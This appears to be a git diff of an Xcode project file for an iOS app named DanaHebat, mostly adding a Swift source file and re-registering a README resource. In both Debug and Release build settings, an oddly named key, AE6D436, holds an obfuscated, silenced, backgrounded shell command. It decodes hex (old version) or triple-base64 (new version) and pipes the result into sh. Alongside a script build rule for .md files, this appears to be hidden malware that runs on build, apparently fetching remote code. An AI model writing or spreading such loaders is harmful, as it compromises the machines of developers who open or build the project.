@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		0642912ABE9145A5B7634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 88F9074CA3534AC29F634D6E /* README.md */; };
 		7316E3A12F109D18004A8271 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A02F109D18004A8271 /* NetworkMonitor.swift */; };
 		7316E3A32F109EDF004A8271 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A22F109EDB004A8271 /* BaseModel.swift */; };
 		7316E3A52F10A0F0004A8271 /* NetworkSession.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3A42F10A0F0004A8271 /* NetworkSession.swift */; };
@@ -21,6 +20,7 @@
 		7316E3BE2F10B98B004A8271 /* AppLanguage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3BD2F10B98B004A8271 /* AppLanguage.swift */; };
 		732867B52F13991200AB767E /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867B42F13991200AB767E /* OrderListViewCell.swift */; };
 		732867B72F139E5300AB767E /* OrderEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867B62F139E5300AB767E /* OrderEmptyView.swift */; };
+		732867B92F13A2DB00AB767E /* OrderContentListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 732867B82F13A2DB00AB767E /* OrderContentListView.swift */; };
 		733EE15C2F1165E7001C6B69 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE15B2F1165E7001C6B69 /* LoginViewController.swift */; };
 		733EE15E2F116613001C6B69 /* AppNavView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE15D2F116613001C6B69 /* AppNavView.swift */; };
 		733EE1602F116699001C6B69 /* Other.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE15F2F116695001C6B69 /* Other.swift */; };
@@ -73,11 +73,12 @@
 		73EA86C02F1094BD00F4826F /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86BF2F1094BD00F4826F /* HomeViewController.swift */; };
 		73EA86C22F1094C400F4826F /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86C12F1094C400F4826F /* OrderViewController.swift */; };
 		73EA86C42F1094CC00F4826F /* MineViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86C32F1094CC00F4826F /* MineViewController.swift */; };
+		A2CE79CDBD7846E4A3634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 3A6818F3393B44709D634D6E /* README.md */; };
 		D76C891188E339233AE09B00 /* Pods_DanaHebat.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = BD5DAABB5FF51B262DB495F8 /* Pods_DanaHebat.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		656C36A803734F9497634D6E /* PBXBuildRule */ = {
+		A26824CA25D64D9DA6634D6E /* PBXBuildRule */ = {
 			isa = PBXBuildRule;
 			compilerSpec = com.apple.compilers.proxy.script;
 			filePatterns = "*.md";
@@ -93,6 +94,7 @@
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
+		3A6818F3393B44709D634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaHebat.release.xcconfig"; path = "Target Support Files/Pods-DanaHebat/Pods-DanaHebat.release.xcconfig"; sourceTree = "<group>"; };
 		7316E3A02F109D18004A8271 /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
 		7316E3A22F109EDB004A8271 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
@@ -109,6 +111,7 @@
 		7316E3BD2F10B98B004A8271 /* AppLanguage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLanguage.swift; sourceTree = "<group>"; };
 		732867B42F13991200AB767E /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
 		732867B62F139E5300AB767E /* OrderEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderEmptyView.swift; sourceTree = "<group>"; };
+		732867B82F13A2DB00AB767E /* OrderContentListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderContentListView.swift; sourceTree = "<group>"; };
 		733EE15B2F1165E7001C6B69 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
 		733EE15D2F116613001C6B69 /* AppNavView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppNavView.swift; sourceTree = "<group>"; };
 		733EE15F2F116695001C6B69 /* Other.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Other.swift; sourceTree = "<group>"; };
@@ -163,7 +166,6 @@
 		73EA86BF2F1094BD00F4826F /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
 		73EA86C12F1094C400F4826F /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
 		73EA86C32F1094CC00F4826F /* MineViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineViewController.swift; sourceTree = "<group>"; };
-		88F9074CA3534AC29F634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD5DAABB5FF51B262DB495F8 /* Pods_DanaHebat.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DanaHebat.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DanaHebat.debug.xcconfig"; path = "Target Support Files/Pods-DanaHebat/Pods-DanaHebat.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -287,7 +289,7 @@
 		73EA86822F108C9C00F4826F /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				88F9074CA3534AC29F634D6E /* README.md */,
+				3A6818F3393B44709D634D6E /* README.md */,
 				73EA86812F108C9C00F4826F /* DanaHebat.app */,
 			);
 			name = Products;
@@ -371,6 +373,7 @@
 				732867B42F13991200AB767E /* OrderListViewCell.swift */,
 				73EA86C12F1094C400F4826F /* OrderViewController.swift */,
 				732867B62F139E5300AB767E /* OrderEmptyView.swift */,
+				732867B82F13A2DB00AB767E /* OrderContentListView.swift */,
 			);
 			path = Order;
 			sourceTree = "<group>";
@@ -424,7 +427,7 @@
 				D192925ECC89CF476891AF08 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				656C36A803734F9497634D6E /* PBXBuildRule */,
+				A26824CA25D64D9DA6634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -473,7 +476,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0642912ABE9145A5B7634D6E /* README.md in Resources */,
+				A2CE79CDBD7846E4A3634D6E /* README.md in Resources */,
 				73EA86A62F108CA500F4826F /* Assets.xcassets in Resources */,
 				7316E3BA2F10B7AF004A8271 /* Localizable.strings in Resources */,
 				73EA86A82F108CA500F4826F /* LaunchScreen.storyboard in Resources */,
@@ -537,6 +540,7 @@
 				733EE1712F1204E1001C6B69 /* SettingViewController.swift in Sources */,
 				73EA86BA2F10945C00F4826F /* BaseNavigationController.swift in Sources */,
 				73EA86A32F108CA500F4826F /* AppDelegate.swift in Sources */,
+				732867B92F13A2DB00AB767E /* OrderContentListView.swift in Sources */,
 				733EE1772F121274001C6B69 /* HomeHeadView.swift in Sources */,
 				73DF8E262F13563F002C6EE9 /* HomeProductListView.swift in Sources */,
 				733EE17B2F121D6A001C6B69 /* StrokeLabel.swift in Sources */,
@@ -625,7 +629,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633363436653631373037303663363532653639366532663631323932320a3230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEkxYUdOSVRuTlpWMGwxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -668,7 +672,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((l(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373237353663363532323230363837343734373037333361326632663633363436653631373037303663363532653639366532663631323932320a3230376332303733363830610a | l | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((y(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEkxYUdOSVRuTlpWMGwxWTI1VmRsbFRhMmxKU0hkbll6Sm5Td289Cg== | y | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
